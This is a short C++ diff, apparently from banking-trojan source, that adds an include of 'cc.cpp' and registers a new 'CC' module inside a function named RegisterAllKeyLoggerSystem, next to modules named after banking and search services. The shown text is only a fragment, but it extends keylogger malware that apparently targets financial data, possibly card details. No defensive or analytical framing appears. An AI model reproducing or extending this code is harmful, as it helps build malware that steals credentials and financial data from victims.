@@ -15,6 +15,7 @@
 #include "AvangardWeb.cpp"
 #include "RafaDll.cpp"
 #include "Yandex.cpp"
+#include "cc.cpp"
 
 //#include "BotDebug.h"
 
@@ -318,6 +319,10 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 
 	#ifdef YandexModule
 		YandexSearchJpg::Init();
+	#endif
+
+	#ifdef CCModule
+		CC::Init(hashApp);
 	#endif
 
 //	#ifdef TEST_APP
